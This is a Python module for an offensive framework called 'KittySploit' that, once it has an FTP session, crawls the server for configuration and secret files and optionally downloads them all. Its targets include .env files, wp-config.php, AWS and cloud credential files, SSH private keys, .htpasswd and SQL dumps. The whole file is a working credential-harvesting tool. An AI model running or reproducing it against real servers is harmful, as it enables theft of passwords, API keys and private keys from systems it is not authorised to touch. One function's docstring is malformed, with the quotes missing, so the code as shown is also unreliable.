#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ftp.ftp_client import FTPClientMixin
import os
import re

class Module(Post, FTPClientMixin):
    """FTP Configuration File Enumeration Module"""
    
    __info__ = {
        "name": "FTP Gather Configuration Files",
        "description": "Searches for configuration files on FTP server that may contain sensitive information (passwords, API keys, database credentials, etc.)",
        "author": "KittySploit Team",
        "session_type": SessionType.FTP,
    }
    
    remote_path = OptString(".", "Remote directory path to search", False)
    max_depth = OptInteger(5, "Maximum directory depth to recurse", False)
    download_configs = OptBool(False, "Download found configuration files", False)
    output_dir = OptString("/output", "Local directory to save downloaded config files", False)
    
    def check(self):
        """Check if the module can run"""
        session_id_value = self.session_id.value if hasattr(self.session_id, 'value') else str(self.session_id)
        if not session_id_value:
            print_error("Session ID not set")
            return False
        
        if not self.framework or not hasattr(self.framework, 'session_manager'):
            print_error("Framework or session manager not available")
            return False
        
        session = self.framework.session_manager.get_session(session_id_value)
        if not session:
            print_error(f"Session {session_id_value} not found")
            return False
        
        # Try to get FTP connection to verify it works
        try:
            self.get_ftp_connection()
            return True
        except Exception as e:
            print_error(f"FTP connection error: {e}")
            return False
    
    def _get_config_patterns(self) -> dict:
        """Get configuration file patterns to search for"""
        return {
            'Web Server Configs': [
                '.htaccess', '.htpasswd', 'httpd.conf', 'apache.conf', 'apache2.conf',
                'nginx.conf', 'nginx.conf.bak', 'web.config', 'httpd.conf.bak'
            ],
            'PHP Configs': [
                'config.php', 'configuration.php', 'config.inc.php', 'settings.php',
                'wp-config.php', 'local_settings.php', 'database.php', 'db.php',
                'db_config.php', 'config.ini', 'php.ini', '.env', '.env.local',
                '.env.production', 'composer.json'
            ],
            'Database Configs': [
                'database.yml', 'database.json', 'db.json', 'db.yaml',
                'mongodb.conf', 'redis.conf', 'my.cnf', 'my.ini'
            ],
            'Framework Configs': [
                'config.json', 'config.yaml', 'config.yml', 'settings.json',
                'application.properties', 'application.yml', 'application.yaml',
                'config.xml', 'settings.xml', 'pom.xml', 'build.xml'
            ],
            'Cloud/API Configs': [
                'credentials.json', 'credentials.yml', 'aws-credentials',
                'gcloud.json', 'azure.json', 'config.aws', '.aws/credentials',
                'service-account.json', 'firebase.json'
            ],
            'SSH/Keys': [
                'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'authorized_keys',
                'known_hosts', 'ssh_config', 'sshd_config', 'private_key',
                'private.key', 'secret.key'
            ],
            'Docker/K8s': [
                'docker-compose.yml', 'docker-compose.yaml', 'Dockerfile',
                'kubernetes.yaml', 'k8s.yaml', 'deployment.yaml'
            ],
            'CI/CD': [
                '.gitlab-ci.yml', '.travis.yml', 'circle.yml', 'Jenkinsfile',
                '.github/workflows/*.yml', 'azure-pipelines.yml'
            ],
            'Other Sensitive': [
                '.env', '.env.local', '.env.production', '.env.development',
                'secrets.json', 'secrets.yml', 'secret', 'secrets',
                'password.txt', 'passwords.txt', 'credentials.txt',
                'backup.sql', 'dump.sql', '*.sql.bak', '*.db.bak'
            ]
        }
    
    def _matches_pattern(self, filename: str, patterns: list) -> bool:
        """Check if filename matches any pattern"""
        filename_lower = filename.lower()
        for pattern in patterns:
            # Exact match
            if filename_lower == pattern.lower():
                return True
            # Wildcard match
            if '*' in pattern:
                pattern_re = pattern.replace('*', '.*').replace('.', r'\.')
                if re.match(pattern_re, filename_lower, re.IGNORECASE):
                    return True
            # Contains match
            if pattern.lower() in filename_lower:
                return True
        return False
    
    def _is_config_file(self, filename: str) -> tuple:
        patterns = self._get_config_patterns()
        for category, file_patterns in patterns.items():
            if self._matches_pattern(filename, file_patterns):
                return (True, category)
        return (False, None)
    
    def _search_config_files(self, path: str, depth: int = 0, found_files: list = None) -> list:        Recursively search for configuration files

        if found_files is None:
            found_files = []
        
        if depth > self.max_depth:
            return found_files
        
        try:
            files = self.list_files(path)
            
            for file_info in files:
                name = file_info.get('name', '')
                file_type = file_info.get('type', 'unknown')
                
                # Skip . and ..
                if name in ['.', '..']:
                    continue
                
                # Check if it's a configuration file
                is_config, category = self._is_config_file(name)
                
                if is_config:
                    remote_file = f"{path}/{name}".replace("//", "/")
                    if path == ".":
                        remote_file = name
                    
                    found_files.append({
                        'path': remote_file,
                        'name': name,
                        'category': category,
                        'size': file_info.get('size', '0'),
                        'date': file_info.get('date', '')
                    })
                    print_success(f"Found: {remote_file} ({category})")
                
                # Recurse into subdirectories
                if file_type == 'directory':
                    new_path = f"{path}/{name}".replace("//", "/")
                    if path == ".":
                        new_path = name
                    self._search_config_files(new_path, depth + 1, found_files)
            
            return found_files
            
        except ProcedureError as e:
            print_error(f"Error accessing {path}: {e}")
            return found_files
        except Exception as e:
            print_error(f"Error searching {path}: {e}")
            return found_files
    
    def _download_config_file(self, remote_path: str, local_path: str) -> bool:
        """Download a configuration file"""
        try:
            self.download_file(remote_path, local_path)
            return True
        except Exception as e:
            print_error(f"Failed to download {remote_path}: {e}")
            return False
    
    def run(self):
        """Run the configuration file enumeration"""
        try:            
            # Get connection info
            conn_info = self.get_connection_info()
            print_info(f"FTP Server: {conn_info.get('host', 'unknown')}:{conn_info.get('port', 21)}")
            print_info(f"Username: {conn_info.get('username', 'unknown')}")
            print_info(f"Search Path: {self.remote_path}")
            print_info(f"Max Depth: {self.max_depth}")
            print_info()
            
            # Change to target directory if specified
            if self.remote_path and self.remote_path != ".":
                try:
                    self.change_directory(self.remote_path)
                    print_info(f"Changed to: {self.remote_path}")
                except Exception as e:
                    print_warning(f"Could not change to {self.remote_path}: {e}")
                    print_info("Searching current directory instead...")
            
            # Create output directory if downloading
            if self.download_configs:
                os.makedirs(self.output_dir, exist_ok=True)
                print_info(f"Download directory: {self.output_dir}")
                print_info("")
            
            # Search for configuration files
            print_status("Searching for configuration files...")
            found_files = self._search_config_files(self.remote_path)
            print_info()

            if not found_files:
                print_error("No configuration files found")
                return True
            
            # Group by category
            by_category = {}
            for file_info in found_files:
                category = file_info['category']
                if category not in by_category:
                    by_category[category] = []
                by_category[category].append(file_info)
            
            # Display results
            print_success(f"Found {len(found_files)} configuration file(s):")
            
            for category, files in sorted(by_category.items()):
                print_info(f"{category}:")
                for file_info in files:
                    size_str = file_info.get('size', '0')
                    date_str = file_info.get('date', '')
                    print_info(f"  - {file_info['path']} ({size_str} bytes, {date_str})")
                print_info()
            
            # Download files if requested
            if self.download_configs and found_files:
                print_status("Downloading configuration files...")
                
                downloaded = 0
                for file_info in found_files:
                    remote_path = file_info['path']
                    # Create local path preserving directory structure
                    local_rel_path = remote_path.lstrip('./')
                    local_path = os.path.join(self.output_dir, local_rel_path)
                    
                    # Create directory if needed
                    local_dir = os.path.dirname(local_path)
                    if local_dir:
                        os.makedirs(local_dir, exist_ok=True)
                    
                    if self._download_config_file(remote_path, local_path):
                        downloaded += 1
                        print_success(f"  ✓ Downloaded: {local_path}")
                
                print_info()
                print_success(f"Downloaded {downloaded}/{len(found_files)} configuration files")
                print_status(f"Files saved to: {os.path.abspath(self.output_dir)}")
                 
            return True
            
        except ProcedureError:
            raise
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, f"Error enumerating configuration files: {e}")

